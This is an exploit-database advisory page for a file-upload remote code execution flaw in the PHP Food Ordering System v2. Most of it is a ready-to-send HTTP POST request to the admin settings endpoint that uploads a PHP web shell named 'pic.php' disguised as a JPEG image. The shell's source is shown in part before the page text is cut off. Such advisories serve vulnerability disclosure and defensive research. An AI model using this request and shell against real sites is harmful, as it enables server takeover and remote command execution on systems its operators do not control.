---
title: Food Ordering System 2 Shell Upload
url: https://cxsecurity.com/issue/WLB-2023010038
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-24
fetch_date: 2025-10-04T04:37:47.524029
---

# Food Ordering System 2 Shell Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Food Ordering System 2 Shell Upload** **2023.01.23**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **High**  Local: **No**  Remote: **No**  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

## Title: Food Ordering System v2 File upload Vulnerability + web-shell upload - RCE
## Author: nu11secur1ty
## Date: 01.23.2023
## Vendor: https://github.com/oretnom23
## Software: https://www.sourcecodester.com/php/16022/online-food-ordering-system-v2-using-php8-and-mysql-free-source-code.html
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/2023/Food-Ordering-System-v2.0
## Description:
The Food Ordering System v2 suffers from, File Upload and web-shell
upload RCE Vulnerabilities.
The upload function for the background image hover of this system is
not sanitizing correctly.
The attacker can upload some RCE malicious code and easily destroy
this system. The status of this system is awful!
## STATUS: HIGH Vulnerability
[+] Exploit:
```GET
POST /fos/admin/ajax.php?action=save\_settings HTTP/1.1
Host: pwnedhost.com
Content-Length: 6157
Accept: \*/\*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107
Safari/537.36
Content-Type: multipart/form-data;
boundary=----WebKitFormBoundaryqYQLHPx3VuntGH7W
Origin: http://pwnedhost.com
Referer: http://pwnedhost.com/fos/admin/index.php?page=site\_settings
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=598nahp235ehmk2broafrh37qq
Connection: close
------WebKitFormBoundaryqYQLHPx3VuntGH7W
Content-Disposition: form-data; name="name"
Online Food Ordering System V2
------WebKitFormBoundaryqYQLHPx3VuntGH7W
Content-Disposition: form-data; name="email"
info@sample.com
------WebKitFormBoundaryqYQLHPx3VuntGH7W
Content-Disposition: form-data; name="contact"
+6948 8542 623
------WebKitFormBoundaryqYQLHPx3VuntGH7W
Content-Disposition: form-data; name="about"
<p style="text-align: center; background: transparent; position:
relative;"><span style="font-size:28px;background: transparent;
position: relative;">ABOUT US</span></b></span></p><p
style="text-align: center; background: transparent; position:
relative;"><span style="background: transparent; position: relative;
font-size: 14px;"><span style="font-size:28px;background: transparent;
position: relative;"><b style="margin: 0px; padding: 0px; color:
rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, Arial, sans-serif;
text-align: justify;">Lorem Ipsum</b><span style="color: rgb(0, 0, 0);
font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-weight:
400; text-align: justify;">&nbsp;is simply dummy text of the printing
and typesetting industry. Lorem Ipsum has been the industry&#x2019;s
standard dummy text ever since the 1500s, when an unknown printer took
a galley of type and scrambled it to make a type specimen book. It has
survived not only five centuries, but also the leap into electronic
typesetting, remaining essentially unchanged. It was popularised in
the 1960s with the release of Letraset sheets containing Lorem Ipsum
passages, and more recently with desktop publishing software like
Aldus PageMaker including versions of Lorem
Ipsum.</span><br></span></b></span></p><p style="text-align: center;
background: transparent; position: relative;"><span style="background:
transparent; position: relative; font-size: 14px;"><span
style="font-size:28px;background: transparent; position:
relative;"><span style="color: rgb(0, 0, 0); font-family: &quot;Open
Sans&quot;, Arial, sans-serif; font-weight: 400; text-align:
justify;"><br></span></b></span></p><p style="text-align: center;
background: transparent; position: relative;"><span style="background:
transparent; position: relative; font-size: 14px;"><span
style="font-size:28px;background: transparent; position:
relative;"><h2 style="font-size:28px;background: transparent;
position: relative;">Where does it come from?</h2><p
style="text-align: center; margin-bottom: 15px; padding: 0px; color:
rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, Arial, sans-serif;
font-weight: 400;">Contrary to popular belief, Lorem Ipsum is not
simply random text. It has roots in a piece of classical Latin
literature from 45 BC, making it over 2000 years old. Richard
McClintock, a Latin professor at Hampden-Sydney College in Virginia,
looked up one of the more obscure Latin words, consectetur, from a
Lorem Ipsum passage, and going through the cites of the word in
classical literature, discovered the undoubtable source. Lorem Ipsum
comes from sections 1.10.32 and 1.10.33 of "de Finibus Bonorum et
Malorum" (The Extremes of Good and Evil) by Cicero, written in 45 BC.
This book is a treatise on the theory of ethics, very popular during
the Renaissance. The first line of Lorem Ipsum, "Lorem ipsum dolor sit
amet..", comes from a line in section
1.10.32.</p></span></b></span></p>
------WebKitFormBoundaryqYQLHPx3VuntGH7W
Content-Disposition: form-data; name="img"; filename="pic.php"
Content-Type: image/jpeg
<!-- Project Name : PHP Web Shell -->
<!-- Version : 4.0 nu11secur1ty -->
<!-- First development date : 2022/10/05 -->
<!-- This Version development date : 2022/10/05 -->
<!-- Moded and working with PHP 8 : 2022/10/05 -->
<!-- language : html, css, javascript, php -->
<!-- Developer : nu11secur1ty -->
<!-- Web site : https://www.nu11secur1ty.com/ -->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
"http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html" charset="euc-kr">
<title>PHP Web Shell Ver 4.0 by nu11secur1ty</title>
<script type="text/javascript">
function FocusIn(obj)
{
if(obj.value == obj.defaultValue)
obj.value = '';
}
function FocusOut(obj)
{
if(obj.value == '')
obj.value = obj.defaultValue;
}
</script>
</head>
<body>
<b>WebShell's Location = http://<?php echo $\_SERVER['HTTP\_HOST'];
echo $\_SERVER['REQUEST\_URI'] ?></b><br><br>
HTTP\_HOST = <?php echo $\_SERVER['HTTP\_HOST'] ?><br>
R...